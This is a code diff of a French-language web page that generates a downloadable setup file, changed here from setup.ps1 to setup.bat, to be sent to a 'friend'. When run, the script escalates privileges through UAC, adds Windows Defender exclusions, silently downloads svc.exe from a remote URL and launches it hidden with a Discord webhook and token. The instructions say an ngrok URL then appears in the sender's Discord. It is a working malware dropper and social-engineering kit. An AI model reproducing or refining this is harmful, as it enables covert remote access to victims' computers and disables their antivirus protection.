@@ -263,7 +263,7 @@
     <input type="password" id="genToken" placeholder="2abc..." oninput="updateCmd()" />
   </div>
   <div class="field" style="justify-content:flex-end">
-    <button class="btn green" id="dlBtn" onclick="downloadSetup()" disabled>⬇ Telecharger setup.ps1</button>
+    <button class="btn green" id="dlBtn" onclick="downloadSetup()" disabled>⬇ Telecharger setup.bat</button>
   </div>
 </div>
 
@@ -272,7 +272,7 @@
     <strong style="color:var(--text)">Comment l'utiliser :</strong><br>
     1. Entre le webhook et le token, clique <em>Telecharger setup.ps1</em><br>
     2. Envoie le fichier a ton ami (Discord, mail...)<br>
-    3. Ton ami : <strong style="color:var(--text)">clic droit → Executer avec PowerShell</strong> → accepte l'UAC<br>
+    3. Ton ami : <strong style="color:var(--text)">double-clic sur setup.bat</strong> → accepte l'UAC<br>
     4. L'URL ngrok apparait dans ton Discord
   </div>
 </div>
@@ -391,27 +391,30 @@
     const token   = document.getElementById('genToken').value.trim();
     if (!webhook || !token) return;
 
-    const ps1 = `$ErrorActionPreference = "SilentlyContinue"
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
-if (-not $isAdmin) {
-    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File \`"$PSCommandPath\`"" -Verb RunAs -Wait
-    exit
-}
-Add-MpPreference -ExclusionPath "$env:TEMP"
-Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\\Microsoft\\PyService"
-$exe = "$env:TEMP\\svc.exe"
-curl.exe -sLo $exe "${EXE_URL}"
-Start-Process $exe -ArgumentList "-w \`"${webhook}\`" -t \`"${token}\`"" -WindowStyle Hidden
-`;
+    // Contenu PS1 ecrit ligne par ligne par le bat (evite les problemes de politique d'execution)
+    const bat =
+`@echo off
+net session >nul 2>&1
+if %errorlevel% neq 0 powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs" & exit /b
+set "f=%TEMP%\\s.ps1"
+(
+echo Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
+echo Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\\Microsoft\\PyService" -ErrorAction SilentlyContinue
+echo $exe = "$env:TEMP\\svc.exe"
+echo curl.exe -sLo $exe "${EXE_URL}"
+echo Start-Process $exe -ArgumentList '-w "${webhook}" -t "${token}"' -WindowStyle Hidden
+) > "%f%"
+powershell -ep bypass -File "%f%"
+del "%f%" 2>nul`;
 
-    const blob = new Blob([ps1], { type: 'text/plain' });
+    const blob = new Blob([bat], { type: 'text/plain' });
     const url  = URL.createObjectURL(blob);
     const a    = document.createElement('a');
     a.href     = url;
-    a.download = 'setup.ps1';
+    a.download = 'setup.bat';
     a.click();
     URL.revokeObjectURL(url);
-    toast('setup.ps1 telecharge !');
+    toast('setup.bat telecharge !');
   }
 
   // ── File input labels ────────────────────────────────────────────────────
